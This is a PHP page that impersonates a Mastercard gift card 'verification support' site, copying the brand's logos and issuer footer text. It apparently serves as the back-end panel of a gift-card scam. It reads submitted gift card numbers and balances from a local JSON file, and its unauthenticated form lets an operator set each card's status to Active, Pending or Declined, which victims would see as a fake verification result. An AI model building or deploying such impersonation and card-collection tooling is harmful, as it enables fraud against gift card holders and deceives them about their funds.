<?php
// Path to the JSON file
$json_file = 'data.json';

// Load the JSON data if the file exists
if (file_exists($json_file)) {
    $json_data = file_get_contents($json_file);
    $cards = json_decode($json_data, true); // Decode JSON data into an associative array
} else {
    $cards = []; // Initialize as an empty array if file doesn't exist
}

// Handle form submission to update status
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_number = $_POST['card_number'];
    $new_status = $_POST['status'];

    // Find and update the card status
    $updated = false;
    foreach ($cards as &$card) {
        if ($card["card_number"] === $card_number) {
            $card["status"] = $new_status;
            $updated = true;
            break;
        }
    }

    // Save back to JSON file
    if ($updated) {
        if (file_put_contents($json_file, json_encode($cards, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE))) {
            $message = "Status updated successfully!";
        } else {
            $message = "Error saving data.";
        }
    } else {
        $message = "Card number not found.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mastercard Verification Support</title>
    <style>
        body{
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        }


            .status-table {
        width: 60%;
        margin: 20px auto;
        border-collapse: collapse;
        font-family: Arial, sans-serif;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        .status-table th, .status-table td {
            padding: 10px;
            border: 1px solid #ddd;
        }

        .status-table th {
            background: #cf4501;
            color: white;
        }

        .status.active { color: green; }
        .status.blocked { color: red; }
        .status.pending { color: orange; }
        .status.unknown { color: gray; }

        .headers{
            background: rgb(79, 78, 78);
            color: #fff;
            font-size: 14px;
            padding: 10px 5px;
            text-align: center;
        }
        .tracker a{
            color: #fff;
            text-decoration: none;
            font-size: 14px;
            width: 70%;
            margin-right: 10%;
        }
        .tracker{
            background: #000;
            color: #fff;
            padding: 18px;
            text-align: right;
        }
        .logs .main a{
            text-decoration: none;
            color: #000;
        }
        .logs .main{
            width: 70%;
            margin: auto;
            align-items: center;
            display: flex;
            justify-content: space-between;
        }
        .logs .main{
            align-items: center;
        }
        .logs{
            background: #fff;
            padding: 5px;
            align-items: center;
        }
        .form-section{
            background: rgb(235, 228, 225);
            padding: 5px;
        }
        .red-pad{
            background: #cf4501;
            padding: 30px;
        }
        .foot-er p{
            letter-spacing: 1px;
            font-size: 11px;
        }
        .foot-er{
            background: #000;
            color: #fff;
        }
        .contain{
            width: 70%;
            margin: auto;
            padding: 30px;
        }
        .main-imgs a{
            color: #fff;
            text-decoration: none;
        }
        .main-imgs{
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
        }
        .formal form{
            padding: 10px;
        }
        .formal p{
            font-size: 12px;
        }
        .formal h3{
            font-size: 13px;
        }
        .formal{
            background: #fff;
            padding: 10px;
            border-top: #cf4501 5px solid;
        }
        select{
            width: 30%;
            padding: 8px;
        }
        input{
            padding: 8px;
            width: 28%;
        }
        button{
            padding: 10px;
            width: 30%;
            font-weight: bold;
            font-size: 17px;
            color: #fff;
            background: #cf4501 ;
            border: 1px solid #cf4501;
        }
       
        @media (max-width: 800px){
        button{
            width: 95%;
        }
        input{
            width: 85%;
        }
        select{
            width: 95%;
        }
       .contain{
        width: 83%;
       }
       body{
        background: #fff;
       }
       .headers p{
        width: 100%;
        font-size: 12px;
        text-align: center;
       }
        }

    </style>
</head>
<body>
    <div class="headers">
        <p>If you need help due to a declined transaction and have sufficient funds to cover the purchase, your Gift Card was most likely declined due to security and safety measures in place to protect your funds.  <br>
            Use your Card in-person or at a different merchant online and make sure to include the card security code. 
        </p>
    </div>
    <div class="tracker">
        <a href="#">Contact Support</a>
    </div>
    <div class="logs">
        <div class="main">
            <img src="https://images.ctfassets.net/06dbyds2udqx/5StdxLZT9WwWIvSq4tvB9h/41ab17859104ff8c7197c089480bfd72/mastercard_circles_92px_2x.png" alt="">
            <a href="/index.php">Verify Gift Card</a>
        </div>
    </div>

    <div class="form-section">
        <div class="contain">
            <div class="formal">
                <form action="" id="verification-form" method="post">
                <h3>Update Verification Status</h3>
                <p>Enter gift card details to update verification status.</p>
              <br>
                <label for="#">Card Number</label> <br>
                <input type="text" name="card_number" placeholder=""> <br> <br>
                <label for="#">Change Status</label> <br>
                <input type="text" name="status" placeholder="Active / Pending / Declined"> <br> <br>
                <button type="submit">Update Status</button>
            </form>
            <h2>Submitted Gift Cards</h2>
    
    <?php if (!empty($cards)) : ?>
        <table>
            <tr id="tab-row">
                <th>Card Number</th>
                <th>Balance</th>
                <th>Status</th>
            </tr>
            <?php foreach ($cards as $card) : ?>
    <tr>
        <td style="padding: 10px; border: 1px solid #ddd; text-align: center; font-weight: bold;">
            XXX-XXXX-<?= substr($card["card_number"], -4); ?>
        </td>
        <td style="padding: 10px; border: 1px solid #ddd; text-align: center; color: green; font-weight: bold;">
            $<?= htmlspecialchars($card["amount"] ?? "0.00"); ?>
        </td>
        <td style="padding: 10px; border: 1px solid #ddd; text-align: center; font-weight: bold; 
            <?php 
                $status = htmlspecialchars($card["status"] ?? "N/A");
                echo ($status == "Active") ? 'color: green;' : (($status == "Pending") ? 'color: orange;' : 'color: red;');
            ?>">
            <?= $status; ?>
        </td>
        <!--  -->
    </tr>
<?php endforeach; ?>
        </table>
    <?php else : ?>
        <p>No gift cards have been submitted yet.</p>
    <?php endif; ?>
            </div>
            <div class="thank-img">
                <img src="" alt="">
            </div>
        </div>
    </div>
    <div class="red-pad">

    </div>

    <footer class="foot-er">
        <div class="contain">
        <div class="main-imgs">
            <img src="https://images.ctfassets.net/06dbyds2udqx/20bcs0qwnoSmnU0kv3LLly/2fe7ce14135da865e1fa585c41864431/symbol.png" alt="">
            <a href="#">Help</a>
        </div>
        <p>Mastercard® Gift Cards are issued by Sutton Bank or Pathward, N.A. pursuant to license by Mastercard International Incorporated, and may be used in the U.S. and District of Columbia everywhere Debit Mastercard cards are accepted. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated. Sutton Bank and Pathward, N.A., Members FDIC. No cash or ATM access. Terms and conditions apply. See Card holder Agreement for details. Cards are distributed and serviced by InComm Financial Services, Inc., which is licensed as a Money Transmitter by the New York State Department of Financial Services. NMLS ID# 912772.  <br> <br> Colorado, Maryland, and Texas customers: View information about addressing complaints regarding our money services business. <br> <br> Copyright ©2025 InComm Payments. All Rights Reserved.</p> <br> <br>
        <!-- <ul>
           <a href="#"> <li>Pathward, N.A. Privacy Policy</li></a>
           <a href="#">   <li>Sutton Bank Privacy Policy</li></a>
            <a href="#">   <li>Terms Of Use</li></a>
                <a href="#">   <li>Cardholder Agreement</li></a>
                    <a href="#"> <li>Accessibility Statement</li> </a>
        </ul>  -->
        </div>
    </footer>
</body>
</html>
